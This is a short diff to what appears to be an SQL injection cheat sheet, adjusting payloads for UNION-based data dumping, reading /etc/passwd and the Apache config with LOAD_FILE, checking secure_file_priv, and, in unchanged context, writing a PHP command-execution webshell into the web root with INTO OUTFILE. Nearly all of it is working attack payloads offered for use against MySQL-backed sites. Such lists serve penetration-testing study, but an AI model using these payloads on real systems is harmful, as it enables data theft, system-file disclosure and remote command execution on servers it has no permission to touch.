@@ -56,11 +56,14 @@ After stuffing the input fields you should either obtain access to the system as
 ' UNION ALL SELECT 1,2,GROUP_CONCAT(CONCAT_WS(':', col1, col2, col3) SEPARATOR ' | ') FROM <TABLE>--
 
 # File read
-' SELECT LOAD_FILE('/etc/passwd')
+' SELECT LOAD_FILE('/etc/passwd')--
 
 # Grab web config info
-LOAD_FILE('/etc/httpd/conf/httpd.conf')
+' SELECT LOAD_FILE('/etc/httpd/conf/httpd.conf')--
 
+AND
+
+' SHOW VARIABLES LIKE 'secure_file_priv'--
 # Create webshell
 ' SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/<FILE>.php"--
 
